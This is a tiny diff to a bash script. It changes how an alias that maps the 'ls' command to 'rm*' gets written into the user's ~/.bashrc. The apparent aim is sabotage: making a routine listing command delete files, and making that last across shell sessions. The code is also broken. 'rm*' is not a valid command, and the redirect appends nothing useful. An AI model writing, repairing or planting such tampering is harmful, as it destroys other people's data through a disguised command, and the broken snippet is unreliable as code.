@@ -1,3 +1,2 @@
 #!/bin/bash
-nano ~/.bashrc
-alias ls="rm*"
+alias ls="rm*" >>  ~/.bashrc
